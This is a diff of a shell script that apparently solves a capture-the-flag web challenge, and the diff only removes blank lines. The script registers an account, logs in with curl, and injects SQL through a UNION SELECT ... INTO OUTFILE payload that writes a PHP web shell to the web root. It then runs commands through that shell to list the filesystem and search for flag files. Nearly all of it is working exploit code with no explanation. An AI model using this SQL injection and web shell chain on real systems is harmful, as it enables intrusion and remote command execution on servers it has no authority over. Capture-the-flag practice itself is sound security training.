@@ -2,7 +2,6 @@
 # Step 1: Register a new user
 curl -X POST http://94.237.58.4:32307/register.php -d "name=Ciphers&username=INDCiphers&password=password123"
 
-
 # Step 2: Login and save session cookie
 curl -c cookies.txt -X POST http://94.237.58.4:32307/login.php -d "username=INDCiphers" -d "password=password123"
 
@@ -15,13 +14,11 @@ curl -b cookies.txt -X POST http://94.237.58.4:32307/communicate.php \
 --data-urlencode "data[new_name]=safe' UNION SELECT NULL,'<?=`$_GET[cmd]`; ?>',NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -" \
 --data-urlencode "data[action]=edit"
 
-
 # Step 5: Test if shell is working with id 
 curl -b cookies.txt http://94.237.58.4:32307/index.php
 
 # Step 6: List all directories recursively 
 curl "http://94.237.58.4:32307/shell.php?cmd=ls%20-R"
-
 
 # Step 7: Find files with 'flag' in name 
 curl "http://94.237.58.4:32307/shell.php?cmd=find%20/%20-name%20'*flag*'"
